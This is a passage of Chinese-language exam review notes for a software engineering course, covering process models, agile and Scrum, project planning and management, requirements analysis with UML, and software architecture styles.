tabindex="-1">（5）螺旋模型(Spiral Model)</h4><p><img src="/images/%E6%9C%AC%E7%A7%91/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E6%9C%9F%E6%9C%AB%E7%AA%81%E5%87%BB/3_2_7.jpg" alt></p><ul><li>优点：<ul><li>集成迭代模型和原型模型</li><li>引入风险分析，风险驱动</li><li>适合于需求不明确、开发风险高、开发过程中需求变更大的内部软件项目</li></ul></li><li>不足：风险驱动、管理复杂</li></ul><h4 id="%EF%BC%886%EF%BC%89%E4%B8%8D%E5%90%8C%E8%BD%AF%E4%BB%B6%E8%BF%87%E7%A8%8B%E6%A8%A1%E5%9E%8B%E7%9A%84%E7%89%B9%E7%82%B9" tabindex="-1">（6）不同软件过程模型的特点</h4><p><img src="/images/%E6%9C%AC%E7%A7%91/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E6%9C%9F%E6%9C%AB%E7%AA%81%E5%87%BB/3_2_8.jpg" alt></p><h3 id="3-%E5%A6%82%E4%BD%95%E6%9D%A5%E9%80%89%E6%8B%A9%E8%BD%AF%E4%BB%B6%E8%BF%87%E7%A8%8B%E6%A8%A1%E5%9E%8B" tabindex="-1">3 如何来选择软件过程模型</h3><h4 id="%EF%BC%881%EF%BC%89%E8%BD%AF%E4%BB%B6%E8%BF%87%E7%A8%8B%E6%A8%A1%E5%9E%8B%E7%9A%84%E9%80%89%E6%8B%A9" tabindex="-1">（1）软件过程模型的选择</h4><ul><li><p>考虑软件项目的特点</p></li><li><p>软件开发团队的水平</p></li><li><p>分析软件过程模型特点</p></li><li><p>互联网应用软件的开发过程模型</p><ul><li>特点：软件需求不确定且快速变化</li><li>如：12306 APP软件，微信软件，淘宝软件</li><li>选用瀑布模型不合适，迭代模型较为合适</li></ul></li><li><p>装备软件的开发过程模型</p><ul><li>特点：软件需求确定且较为稳定</li><li>如：飞行控制软件</li><li>可考虑选用瀑布模型，用迭代模型不是很合适</li></ul></li></ul><h4 id="%EF%BC%882%EF%BC%89%E4%BC%A0%E7%BB%9F%E8%BD%AF%E4%BB%B6%E8%BF%87%E7%A8%8B%E6%A8%A1%E5%9E%8B%E7%9A%84%E7%89%B9%E7%82%B9%E5%92%8C%E4%B8%8D%E8%B6%B3" tabindex="-1">（2）传统软件过程模型的特点和不足</h4><ul><li>软件开发和运维的大量工作用于撰写软件文档，而非去编写程序代码</li><li>软件开发过程中会花费大量时间和精力用于软件文档的评审，以确保软件质量</li><li>一旦软件需求发生变化，开发人员需要修改软件需求文档，并据此来调整其他的一系列文档，最后再修改程序代码</li><li>等较长时间才能得到可运行软件系统</li><li><strong>以文档为中心的重型软件开发方法，非常笨重</strong></li></ul><h3 id="4-%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91%E6%96%B9%E6%B3%95%E6%A6%82%E8%BF%B0" tabindex="-1">4 软件开发方法概述</h3><ul><li>Parnas方法</li><li>结构化方法</li><li>面向对象方法</li><li>给予构件的开发方法</li><li>敏捷开发方法</li><li>群体化开发方法</li></ul><h4 id="%EF%BC%881%EF%BC%89parnas%E6%96%B9%E6%B3%95" tabindex="-1">（1）Parnas方法</h4><ul><li>出发点：可靠性，可维护性</li><li>策略<ul><li>信息隐蔽：在设计时仅列出将来可能发生变化的因素，并在模块划分时将这些因素局部化</li><li>意外故障处理：软件的非连续性，小错误会引发严重的事故，所以必须加强防范</li></ul></li><li>特点：Parnas对软件开发提出了深刻的见解，但没有明确的流程，不能独立使用</li></ul><h4 id="%EF%BC%882%EF%BC%89%E7%BB%93%E6%9E%84%E5%8C%96%E6%96%B9%E6%B3%95" tabindex="-1">（2）结构化方法</h4><ul><li>出发点：清晰的程序结构，可理解性。</li><li>求解复杂问题的一般办法：分而治之（模块化）</li><li>策略：模块化，自顶向下、逐步求精；SA+SD+SP（系统分析（System Analysis），系统设计（System Design），软件编程（Software Programming））</li><li>程序=数据+算法，分为：<ul><li>面向数据流的结构化方法</li><li>面向数据结构的结构化方法</li></ul></li><li>特点：<ul><li>数据和行为分开——鸿沟</li><li>难开发、难理解、不安全、可维护性低</li></ul></li></ul><h4 id="%EF%BC%883%EF%BC%89%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%9A%84%E6%96%B9%E6%B3%95" tabindex="-1">（3）面向对象的方法</h4><ul><li>出发点：对问题领域的实体特征直接自然模拟，更易于理解和开发，结构更稳定。<ul><li>程序=对象+消息</li></ul></li><li>策略：<ul><li>通过一组对象的交互来完成系统的功能，对象是领域实体的软件抽象</li><li>OOA+OOD+OOP 面向对象分析（Object-Oriented Analysis）、面向对象设计（Object-Oriented Design）和面向对象编程（Object-Oriented Programming）</li><li>自顶向下和自底向上相结合</li></ul></li><li>特点：<ul><li>对象把数据和操作封装在一起</li><li>更稳定、更安全、提高了可维护性和可重用性</li></ul></li></ul><h4 id="%EF%BC%884%EF%BC%89%E5%9F%BA%E4%BA%8E%E6%9E%84%E4%BB%B6%E7%9A%84%E5%BC%80%E5%8F%91%E6%96%B9%E6%B3%95" tabindex="-1">（4）基于构件的开发方法</h4><ul><li>出发点：提高软件开发效率和质量的基本途径是复用，用大块编程取代，程序=构件+连接件</li><li>策略：<ul><li>有目的地开发可复用的构件（develop for reuse）</li><li>管理已有的构件 （management for reuse）</li><li>复用已有的构件开发新软件（development by reuse）</li></ul></li><li>特点：<ul><li>降低开发和维护成本</li><li>提升开发效率和质量</li></ul></li></ul><h4 id="%EF%BC%885%EF%BC%89%E6%95%8F%E6%8D%B7%E5%BC%80%E5%8F%91%E6%96%B9%E6%B3%95" tabindex="-1">（5）敏捷开发方法</h4><ul><li><p>定义：一种轻量级软件开发方法（相对于重量级的软件开发方法而言）</p></li><li><p>主张软件开发要以代码为中心，快速、轻巧和主动应对需求变化，持续、及时交付可运行的软件系统</p></li><li><p>敏捷开发方法的基本观点</p><ul><li>较之于过程和工具，应更加重视人和交互的价值</li><li>较之于面面俱到文档，应更加重视可运行软件系统的价值</li><li>较之于合同谈判，应更加重视客户合作的价值</li><li>较之于遵循计划，应更加重视响应用户需求变化的价值</li></ul></li><li><p>敏捷方法体现的思想</p><ul><li>强化可运行的软件，弱化文档：以可运行软件为中心来开展软件开发</li><li>以适应变化为目的来推进开发：针对变化不断进行优化和调整任务、产品和计划等</li><li>以人为本：敏捷软件开发是面向人的而不是面向过程的，让方法、技术、工具、过程等来适应人，而不是让人来适应它们</li></ul></li><li><p><strong>敏捷开发方法是一大类方法的统称，它们遵循敏捷思想</strong></p></li><li><p>支持敏捷软件开发的技术</p><ul><li>极限编程</li><li>测试驱动开发<ul><li>在开发程序代码之前，先确定和编写测试</li><li>程序员首先要思考如何对某个功能进行测试，设计好相应的测试用例，编写好相关的测试代码，然后编写相应的程序代码以通过软件测试</li></ul></li><li>Scrum方法：旨在通过增量或迭代的方式加强软件项目的管理<ul><li>首先，产品拥有者需创建软件产品订单库即“Backblog”<ul><li>描述软件产品需提供的功能需求以及它们的优先级排序</li></ul></li><li>其次，筛选出最应该实现的软件需求，<ul><li>Scrum主人基于“Backblog”中各项软件需求及其优先级，形成待实现的软件产品冲刺订单库，即“SprintLog”</li></ul></li><li>然后，软件开发将进入冲刺“Sprint”周期<ul><li>以实现选定软件订单，每个冲刺就是一次增量开发，一般持续1到4周</li></ul></li><li>最后，共同开展Scrum评审<ul><li>一次冲刺完成后，每个团队成员演示自己的开发成果，大家共同审查成果是否高质量地实现了既定功能，并就其中的问题进行反思，以指导和改进下一次冲刺</li></ul></li></ul></li></ul></li></ul><h4 id="%EF%BC%886%EF%BC%89%E7%BE%A4%E4%BD%93%E5%8C%96%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91%E6%96%B9%E6%B3%95" tabindex="-1">（6）群体化软件开发方法</h4><ul><li><p>依托互联网平台来吸引、汇聚、组织和管理互联网上的大规模软件开发人员，通过竞争、合作、协商等多种自主协同方式，让他们参与软件开发、分享软件开发知识和成果、贡献智慧和力量的一种新颖软件开发方法</p></li><li><p>群体化软件开发是一种基于社区的软件开发模式<br><img src="/images/%E6%9C%AC%E7%A7%91/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E6%9C%9F%E6%9C%AB%E7%AA%81%E5%87%BB/3_4_1.jpg" alt></p></li><li><p>群体化软件开发方法的支撑关键技术</p><ul><li>基于社区的群体化组织<ul><li>开源软件社区将核心开发人员与外围开发人员有机地结合在一起，依托软件仓库进行分布式协同开发</li></ul></li><li>基于Issue的任务管理<ul><li>开发任务的二类形式：修复软件缺陷、功能实现需求</li><li>创建Issue，提出软件开发任务</li><li>讨论Issue，分析开发任务的意义和价值</li><li>指派Issue，安排人员来完成Issue</li><li>掌控Issue，掌握Issue解决的进展状况</li></ul></li><li>基于Git的分布式版本管理</li><li>基于Pull/Request的分布式协同开发<ul><li>每个开发人员在本地完成编程工作后，不是直接向中心仓库推送代码，而是通过发送一个P/R合并请求，将原始代码库的克隆库推荐合并到中心仓库之中</li><li>接收到合并请求后，软件项目管理团队和开发人员群体需要对P/R进行审查</li></ul></li><li>基于群智的知识分享</li></ul></li></ul><h2 id="%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E8%BD%AF%E4%BB%B6%E8%AE%A1%E5%88%92%E7%AE%A1%E7%90%86" tabindex="-1">第四章 软件计划管理</h2><h3 id="1-%E8%BD%AF%E4%BB%B6%E8%AE%A1%E5%88%92" tabindex="-1">1 软件计划</h3><h4 id="%EF%BC%881%EF%BC%89%E8%BD%AF%E4%BB%B6%E8%AE%A1%E5%88%92%E6%A6%82%E8%BF%B0" tabindex="-1">（1）软件计划概述</h4><ul><li>软件计划是对软件实施所涉及的目标、任务、活动、资源、进度等进行规划</li><li>合同和策划阶段<ul><li>制定初步软件开发计划</li><li>软件项目计划分发到各个开发成员</li><li>每个成员准确了解各自任务和工作以及实施进度要求</li></ul></li><li>项目实施过程<ul><li>根据软件开发的具体计划有序实施项目</li><li>发现项目实施中存在的问题：如进度滞后</li><li>出现偏差后调整软件项目计划</li></ul></li><li>项目完成之后<ul><li>总结项目计划实施情况</li><li>分析原因，指导后续其他项目的计划制定</li></ul></li></ul><h4 id="%EF%BC%882%EF%BC%89%E8%BD%AF%E4%BB%B6%E8%BF%9B%E5%BA%A6%E5%AE%89%E6%8E%92" tabindex="-1">（2）软件进度安排</h4><ul><li><p>两种途径</p><ul><li>项目、资源 → 制定计划、交付日期</li><li>从后往前安排 ← 最后期限</li></ul></li><li><p>进度管理中要妥善处理的2个问题</p><ul><li>识别任务之间的并行、依赖关系</li><li>资源的分配和优化</li></ul></li><li><p>甘特图</p><ul><li>优点：简单，醒目，能动态地反映开发进展</li><li>缺点：不表示活动之间的依赖关系</li></ul></li><li><p>计划网络图</p><ul><li>反映任务间的顺序、并行依赖关系</li></ul></li><li><p>软件进度计划的任务</p><ul><li>确定每个活动的最早（最迟）开始时间和完成时间。</li><li>在开发方已有的资源投入下求解该软件项目的交付日期（工期），或给定工期（投资方要求）条件下来安排各活动的开始时间和结束时间。</li><li>确定关键活动、重点监管关键线路。所谓<strong>关键活动</strong>是指由于这些活动完成的耽误或更改，将直接影响项目工期目标完成。全部由关键活动组成的线路或者线路长度最长的线路称为关键线路。</li><li>根据给定的工期目标和已有项目各活动时长的条件下，对进度进行调整和优化</li></ul></li></ul><h4 id="%EF%BC%883%EF%BC%89%E8%AE%A1%E5%88%92%E7%9A%84%E4%BC%98%E5%8C%96" tabindex="-1">（3）计划的优化</h4><ul><li>工期优化<ul><li>若网络计划图的计算工期大于要求的工期时，必须根据要求计划的进度，缩短工程项目的完工工期。主要从两个方面考虑：<ul><li>优化活动间的逻辑关系，串行到并行</li><li>采取技术措施，提高开发效率，缩短关键工序的持续时间。</li><li>采取组织措施，充分利用非关键工序的机动时间，合理调配人力、物力和资金等，增加对关键工序的投入，以便缩短关键工序的持续时间</li></ul></li></ul></li><li>资源优化<ul><li>在项目工期不变的条件下，合理地利用资源。具体包括：<ul><li>优先安排关键工序所需的资源</li><li>利用非关键工序的机动时间，错开各工序的开始时间，避开在同一时区内集中使用同一资源以免出现高峰</li><li>在确实受到资源制约，或在考虑综合经济效益的条件下，在许可时也可适当推迟工期，实现错开高峰的目的。</li></ul></li></ul></li></ul><h3 id="2-%E8%BD%AF%E4%BB%B6%E7%AE%A1%E7%90%86" tabindex="-1">2 软件管理</h3><h4 id="%EF%BC%881%EF%BC%89%E8%BD%AF%E4%BB%B6%E7%AE%A1%E7%90%86%E7%9A%84%E7%89%B9%E7%82%B9" tabindex="-1">（1）软件管理的特点</h4><ul><li>目标性: 获得预期的结果</li><li>进度性: 在限定期间完成</li><li>约束性: 具有有限的资源（如人员、经费、工具等）</li><li>多方性: 涉及多个不同人与组织</li><li>独立性: 无重复性</li><li>不确定性: 项目的实施及其结果不确定性</li></ul><h4 id="%EF%BC%882%EF%BC%89%E8%BD%AF%E4%BB%B6%E7%AE%A1%E7%90%86%E5%86%85%E5%AE%B9" tabindex="-1">（2）软件管理内容</h4><p><img src="/images/%E6%9C%AC%E7%A7%91/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E6%9C%9F%E6%9C%AB%E7%AA%81%E5%87%BB/4_2_2.jpg" alt></p><ul><li><p>何为软件项目管理?</p><ul><li>对软件项目所涉及的过程、人员、产品、成本和进度等要素进行度量、分析、规划、组织和控制的过程，以确保软件项目按照预定的成本、进度、质量要求顺利完成</li><li>人员：团队建设和管理纪律和激励机制</li><li>过程：过程定义，软件度量，项目计划，项目跟踪</li><li>产品：软件产品质量管理，软件产品配置管理，软件产品需求管理</li></ul></li><li><p>过程管理</p><ul><li><ol><li>过程定义：定义、文档化软件开发过程、明确软件开发活动，得到一个良定义、全面、灵活、简洁和可供剪裁的软件开发过程</li></ol></li><li><ol start="2"><li>软件度量：对软件项目的过程、产品、资源的属性的定量描述，如软件项目的规模、成本、工作量、质量等</li></ol></li><li><ol start="3"><li>项目计划</li></ol></li><li><ol start="4"><li>项目跟踪：随时掌握软件项目的实际开发情况，提供项目实施情况的可视性，保证计划的适时调整</li></ol></li><li><ol start="5"><li>风险管理：对软件开发过程中各种风险进行识别、分析、预测、评估、监控的过程</li></ol></li></ul></li><li><p>产品管理</p><ul><li>软件质量保证：为软件产品的质量提供某种可视性，知道哪些地方有质量问题，便于改进方法和措施，提高软件产品的质量</li><li>软件配置管理：对软件基线产品进行标识、存储、更动和发放，记录和报告其状态，确保软件产品的正确性和一致性，并对上述工作的审计的过程</li><li>软件需求管理：获取、文档化和评审用户需求，对用户需求变更进行控制和管理</li></ul></li><li><p>人员管理</p><ul><li>软件项目团队：确定开发团体的结构、明确人员的角色和任务、加强人员间的交流与合作，结构合理、任务明确、团结协作、交流顺畅</li><li>纪律激励机制：制定和实施纪律约束团体，通过激励机制激发人员的激情，严格的纪律，饱满的激情</li></ul></li></ul><h4 id="%EF%BC%883%EF%BC%89%E8%BD%AF%E4%BB%B6%E7%AE%A1%E7%90%86%E7%9A%84%E6%96%B9%E6%B3%95" tabindex="-1">（3）软件管理的方法</h4><ul><li>人员组织方式<ul><li>民主制程序员组</li><li>主程序员组</li><li>现代程序员组：实际的“主程序员”应该由两个人共同担任：  一个技术负责人，负责小组的技术活动；一个行政负责人，负责所有非技术性事务的管理决策。</li></ul></li></ul><h2 id="%E7%AC%AC%E4%BA%94%E7%AB%A0-%E9%9C%80%E6%B1%82%E5%88%86%E6%9E%90" tabindex="-1">第五章 需求分析</h2><h3 id="1-%E9%9C%80%E6%B1%82%E5%88%86%E6%9E%90%E5%9F%BA%E7%A1%80" tabindex="-1">1 需求分析基础</h3><ul><li>需求的概念：分类、特点、质量要求、重要性</li><li>需求工程<ul><li>需求工程的一般过程</li><li>需求工程的常用方法<ul><li>结构化需求分析方法</li><li>面向对象需求分析方法</li></ul></li></ul></li><li>需求工程的输出、评审和管理</li></ul><h4 id="%EF%BC%881%EF%BC%89%E9%9C%80%E6%B1%82%E7%9A%84%E6%A6%82%E5%BF%B5" tabindex="-1">（1）需求的概念</h4><ul><li><p>软件开发的本质<br><img src="/images/%E6%9C%AC%E7%A7%91/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E6%9C%9F%E6%9C%AB%E7%AA%81%E5%87%BB/5_1_1.jpg" alt></p></li><li><p>何为利益相关方(stakeholder)</p><ul><li>从软件系统中受益或与软件系统相关的人、组织或者系统</li><li>受益：使用、获益、盈利</li><li>相关：发生操作和交互、存在关联性</li></ul></li><li><p>软件利益相关方的表现形式</p><ul><li>用户：最终使用软件的人</li><li>客户：从中获取利益的组织</li><li>系统：与待开发系统进行交互的系统</li><li>开发者：负责开发软件系统的人</li><li>示例：空巢老人看护软件利益相关方<ul><li>用户：老人，家属，医生</li><li>客户：投资方</li><li>系统：机器人</li></ul></li></ul></li><li><p>何为软件需求(Software Requirement)?</p><ul><li>从软件本身的角度，软件需求是指软件用于解决现实世界问题时所表现出的功能和性能等方面的要求</li><li>从软件利益相关方的角度，软件需求是指软件系统的利益相关方对软件系统的功能和质量，以及软件运行环境、交付进度等方面提出的期望和要求</li></ul></li><li><p>软件需求的类别</p><ul><li>软件功能性需求(Functional)<ul><li>能够完成的功能及在某些场景下可展现的外部可见行为或效果</li></ul></li><li>软件质量方面的需求(Quality)<ul><li>外部质量属性，外部可展现的，用户、客户等会非常关心，如运行性能、可靠性、易用性等</li><li>内部质量属性，隐藏在内部的，软件开发工程师会非常关心，如可扩展性、可维护性、可理解性</li></ul></li><li>软件开发约束性需求(Constraint)<ul><li>开发成本、交付进度、技术选型、遵循标准等方面提出的要求</li></ul></li><li>软件需求示例：空巢老人看护软件<ul><li>功能性需求：自主跟随老人、获取老人图像和视频信息、检测老人是否摔倒等</li><li>质量方面的需求：始终保持在2米的安全距离，对机器人的控制在2秒内响应等</li><li>约束性需求：成本不能超出50万元，要求半年内交付使用等等</li></ul></li></ul></li><li><p>软件需求的重要性</p><ul><li>软件的价值所在</li><li>软件开发的基础和前提</li><li>软件验收的标准和依据</li></ul></li></ul><h4 id="%EF%BC%882%EF%BC%89%E9%9C%80%E6%B1%82%E5%B7%A5%E7%A8%8B" tabindex="-1">（2）需求工程</h4><ul><li><p>旨在用工程的理念和方法来指导软件需求实践，它提供了一系列的过程、策略、方法学和工具，帮助需求工程师加强对业务或领域问题及其环境的理解、获取和分析软件需求，指导软件需求的文档化和评审，以尽可能获得准确、一致和完整的软件需求，产生软件需求的相关软件制品<br><img src="/images/%E6%9C%AC%E7%A7%91/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E6%9C%9F%E6%9C%AB%E7%AA%81%E5%87%BB/5_1_2.jpg" alt></p></li><li><p>需求工程的方法学</p><ul><li>抽象<ul><li>20世纪70年代结构化数据和数据流抽象</li><li>20世纪90年代面向对象抽象</li></ul></li><li>建模<ul><li>采用自然语言或结构化自然语言</li><li>图形化的需求建模语言</li></ul></li><li>分析<ul><li>循序渐进地获得软件需求细节，进而逐步得到详细的软件需求</li></ul></li></ul></li><li><p>需求工程方法（详见复习重点）</p><ul><li>结构化需求分析方法</li><li>面向对象需求分析方法</li></ul></li><li><p>需求工程的输出</p><ul><li>软件需求模型</li><li>软件需求文档</li><li>软件原型</li><li>修正的软件开发计划</li><li>验收测试计划</li></ul></li></ul><h3 id="2-%E9%9C%80%E6%B1%82%E8%8E%B7%E5%8F%96" tabindex="-1">2 需求获取</h3><ul><li><p>获取软件需求是指得到或产生软件需求</p></li><li><p>明确问题和基于软件的解决方案</p></li><li><p>导出和构思初步软件需求</p></li><li><p>描述初步软件需求</p><ul><li>自然语言描述</li><li>软件原型模式</li><li><strong>用例图描述</strong>（详见复习重点）</li></ul></li><li><p>用例的进一步详细描述</p><ul><li>用例名：用户登录</li><li>用例标识： UC-UserLogin</li><li>主要执行者：家属、医生</li><li>目标：通过合法身份登录系统以获得操作权限</li><li>范围：空巢老人看护软件</li><li>前置条件：使用App软件之时</li><li>交互动作：<ul><li>用户输入账号和密码</li><li>系统验证用户账号和密码的正确性和合法性</li><li>验证正确和合法则意味着登录成功</li></ul></li></ul></li></ul><h3 id="3-%E5%88%86%E6%9E%90%E8%BD%AF%E4%BB%B6%E9%9C%80%E6%B1%82" tabindex="-1">3 分析软件需求</h3><h4 id="%EF%BC%881%EF%BC%89%E5%88%86%E6%9E%90%E8%BD%AF%E4%BB%B6%E9%9C%80%E6%B1%82%E6%A6%82%E8%BF%B0" tabindex="-1">（1）分析软件需求概述</h4><ul><li><p>基于初步软件需求，进一步精化和分析软件需求，确定软件需求优先级，建立软件需求模型，发现和解决软件需求缺陷，形成高质量的软件需求模型和软件需求规格说明书</p></li><li><p>用例视角</p><ul><li>具有哪些功能、功能间有何关系、功能与利益相关方有何关系</li><li>UML提供了用例图来分析和描述用例视角的软件需求模型</li></ul></li><li><p>行为视角</p><ul><li>用例是如何通过业务领域中一组对象以及它们间的交互来达成的</li><li>UML提供了交互图、状态图来描述行为视角的软件需求模型</li></ul></li><li><p>结构视角</p><ul><li>业务领域有哪些重要的领域概念以及它们之间具有什么样的关系</li><li>UML提供了类图来描述和分析业务领域的概念模型</li></ul></li><li><p><strong>UML交互图</strong> 详见重点</p></li><li><p><strong>类图</strong> 详见重点</p></li><li><p><strong>对象图</strong></p><ul><li>类图在系统的运行过程中某个时刻点上或某一时间段内的实例化样本<ul><li>类图中的一个类在对象图中可表现为多个活跃的对象实例</li><li>对象图的链接边是类图中关联边的实例化</li><li>类图中的其他边，如继承、依赖等在对象图中则无从表现</li></ul></li><li>示例：<img src="/images/%E6%9C%AC%E7%A7%91/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E6%9C%9F%E6%9C%AB%E7%AA%81%E5%87%BB/%E5%AF%B9%E8%B1%A1%E5%9B%BE%E7%A4%BA%E4%BE%8B.jpg" alt></li><li>不常用</li></ul></li><li><p><strong>状态图</strong></p><ul><li>功效<ul><li>描述实体（对象、系统）在事件刺激下的反应式动态行为及其导致的状态变化</li><li>刻画了实体的可能状态、每个状态下可响应事件、响应动作、状态迁移</li></ul></li><li>图的构成<ul><li>节点：状态</li><li>边：迁移，即状态间因事件刺激而触发的状态变化</li></ul></li></ul></li></ul><h4 id="%EF%BC%882%EF%BC%89%E5%88%86%E6%9E%90%E8%BD%AF%E4%BB%B6%E9%9C%80%E6%B1%82%E8%BF%87%E7%A8%8B" tabindex="-1">（2）分析软件需求过程</h4><ol><li>分析和确定软件需求优先级<ul><li>分析软件需求重要性</li><li>分析软件需求优先级</li><li>确定用例分析和实现的次序</li></ul></li><li>分析和确定软件需求模型<br><img src="/images/%E6%9C%AC%E7%A7%91/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E6%9C%9F%E6%9C%AB%E7%AA%81%E5%87%BB/%E5%BB%BA%E7%AB%8B%E8%BD%AF%E4%BB%B6%E9%9C%80%E6%B1%82%E6%A8%A1%E5%9E%8B%E5%85%B7%E4%BD%93%E6%AD%A5%E9%AA%A4.jpg" alt><br><strong>分析和建立用例的交互模型</strong>见重点<ul><li>分析和建立分析类模型<ul><li>确定分析类</li><li>确定分析类的职责</li><li>确定分析类的属性</li><li>确定分析类之间的关系</li><li>绘制分析类图</li></ul></li><li>分析和建立软件需求的状态模型<ul><li>用UML的状态图来描述这些对象的状态模型，以刻画对象拥有哪些状态、对象的状态如何受事件的影响而发生变化</li></ul></li></ul></li></ol><h4 id="%EF%BC%883%EF%BC%89%E8%BD%AF%E4%BB%B6%E9%9C%80%E6%B1%82%E6%96%87%E6%A1%A3%E5%8F%8A%E8%AF%84%E5%AE%A1" tabindex="-1">（3）软件需求文档及评审</h4><h2 id="%E7%AC%AC%E5%85%AD%E7%AB%A0-%E8%BD%AF%E4%BB%B6%E8%AE%BE%E8%AE%A1" tabindex="-1">第六章 软件设计</h2><h3 id="1-%E8%BD%AF%E4%BB%B6%E8%AE%BE%E8%AE%A1%E6%A6%82%E8%BF%B0" tabindex="-1">1 软件设计概述</h3><h4 id="%EF%BC%881%EF%BC%89%E8%BD%AF%E4%BB%B6%E8%AE%BE%E8%AE%A1%E5%9F%BA%E7%A1%80" tabindex="-1">（1）软件设计基础</h4><ul><li><p>软件设计：针对软件需求，综合考虑各种制约因素，探究软件实现的解决方案</p></li><li><p>设计前提：软件需求</p><ul><li>定义了要做什么样的软件</li></ul></li><li><p>设计考虑：制约因素</p><ul><li>资源：时间、人力、财力、开发辅助工具</li><li>技术：技术平台，如DBMS还是文件系统<br><img src="/images/%E6%9C%AC%E7%A7%91/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E6%9C%9F%E6%9C%AB%E7%AA%81%E5%87%BB/%E8%BD%AF%E4%BB%B6%E8%AE%BE%E8%AE%A1%E8%BF%87%E7%A8%8B.jpg" alt></li></ul></li><li><p>软件设计过程</p><ul><li>软件结构设计<ul><li>从全局和宏观视角、站在最高抽象层次来设计软件系统</li></ul></li><li>用户界面设计<ul><li>设计软件对外展示以及与用户进行交互的界面，关注软件如何与用户进行交互</li></ul></li><li>软件详细设计<ul><li>对体系结构设计和人机交互设计成果进行细化和精化，获得高质量的、充分细化的软件设计模型</li><li>数据设计；接口设计；类设计；算法设计；</li></ul></li></ul></li><li><p>软件设计元素</p><ul><li>设计类：类既是最基本的设计单元，也是最基本的模块单元<br>软构件</li><li>软构件<ul><li>可分离、可单独重用、可独立部署和执行的一类设计元素</li><li>如动态链接库（.DLL）、可运行的Java JAR包、微服务镜像等就属于软构件</li></ul></li><li>子系统<ul><li>完成特定功能、逻辑上相互关联的一组模块集合</li><li>有助于管理软件系统的复杂度，简化软件设计和实现</li></ul></li></ul></li><li><p>软件设计基本原则</p><ul><li>抽象原则</li><li>模块化、高内聚度和低耦合度原则</li><li>信息隐藏原则</li><li>关注点分离原则</li><li>软件重用原则</li></ul></li></ul><h4 id="%EF%BC%882%EF%BC%89%E8%BD%AF%E4%BB%B6%E8%AE%BE%E8%AE%A1%E6%96%B9%E6%B3%95" tabindex="-1">（2）软件设计方法</h4><ul><li>结构化方法<ul><li><ol><li>复审并精化数据流图</li></ol></li><li><ol start="2"><li>确定输入流和输出流的边界</li></ol></li><li><ol start="3"><li>第一级分解方法</li></ol></li><li><ol start="4"><li>第二级分解方法</li></ol></li><li><ol start="5"><li>软件结构求精</li></ol></li></ul></li><li>面向对象方法<ul><li><img src="/images/%E6%9C%AC%E7%A7%91/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E6%9C%9F%E6%9C%AB%E7%AA%81%E5%87%BB/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E8%BD%AF%E4%BB%B6%E8%AE%BE%E8%AE%A1%E8%BF%87%E7%A8%8B.jpg" alt></li><li>用包图表示的软件系统的结构设计</li><li>用交互图来表示用户界面设计</li></ul></li></ul><h3 id="2-%E8%BD%AF%E4%BB%B6%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84%E8%AE%BE%E8%AE%A1" tabindex="-1">2 软件体系结构设计</h3><h4 id="%EF%BC%881%EF%BC%89%E8%BD%AF%E4%BB%B6%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84%E5%9F%BA%E7%A1%80" tabindex="-1">（1）软件体系结构基础</h4><ul><li><p>软件体系结构设计元素</p><ul><li>构件/组件(Component)：构成体系结构的基本功能部件<ul><li>软件系统中的物理模块，具有特定的功能和精确定义的对外接口，外界可通过接口来访问它</li><li>例：.dll,.jar文件</li></ul></li><li>连接件：组件之间的连接和交互关系<ul><li>每个软构件并非孤立，它们之间通过连接进行交互</li><li>交互的目的是为了交换数据、获得服务</li><li>例：接口，端口</li></ul></li><li>约束</li></ul></li><li><p>软件体系结构设计视图</p><ul><li>逻辑视图</li><li>开发视图</li><li>部署视图</li><li>运行视图</li></ul></li><li><p>软件体系结构建模</p><ul><li>包图</li><li>构件图</li><li>部署图<br>软件体系结构风格<br>分层风格、管道过滤器风格、黑板风格、MVC风格、SOA风格、消息总线风格</li></ul></li><li><p>软件设计模式：以设计重用为目的，采用一种良定义的、正规的、一致的方式记录的软件设计经验</p></li><li><p>常用软件体系结构风格</p><ul><li>分层风格<ul><li>层次间的关系<ul><li>每层为其紧邻上层提供服务，使用紧邻下层所提供的服务</li><li>上层向下层发出服务请求，下层为上层反馈服务结果</li><li>下层向上层提供事件信息，上层对下层通知做出处理</li></ul></li><li>特点：松耦合，可替换，可复用，标准化</li></ul></li><li>管道与过滤器风格<ul><li>构件<ul><li>将软件功能实现为一系列处理步骤，每个步骤封装在一个过滤器构件中</li></ul></li><li>连接子<ul><li>相邻过滤器间以管道连接，一个过滤器的输出数据借助管道流向后续过滤器，作为其输入数据</li></ul></li><li>编译器采用的就是一个典型的管道/过滤器风格</li></ul></li><li>黑板风格：将软件系统划分为黑板、知识源和控制器三类构件<ul><li>黑板：负责保存问题求解过程中的状态数据，并提供这些数据的读写服务</li><li>知识源：负责根据黑板中存储的问题求解状态评价其自身的可应用性，进行部分问题求解工作，并将此工作的结果数据写入黑板</li><li>控制器：负责监视黑板中不断更新的状态数据，安排（多个）知识源的活动</li></ul></li><li>MVC风格<ul><li>模型构件：负责存储业务数据并提供业务逻辑处理功能</li><li>视图构件：负责向用户呈现模型中的数据</li><li>控制器：在接获模型的业务逻辑处理结果后，负责选择适当的视图作为软件系统对用户的界面动作的响应</li><li>步骤：<ul><li>创建视图，视图对象从模型中获取数据并呈现用户界面</li><li>控制器将用户界面事件转换为业务逻辑处理功能的调用</li><li>模型进行业务逻辑处理，将处理结果回送给控制器，必要时还需将业务数据变化事件通知给所有视图</li></ul></li></ul></li><li>SOA风格<ul><li>将软件系统的软构件抽象为一个个的服务（Service），每个服务封装了特定的功能并提供了对外可访问的接口<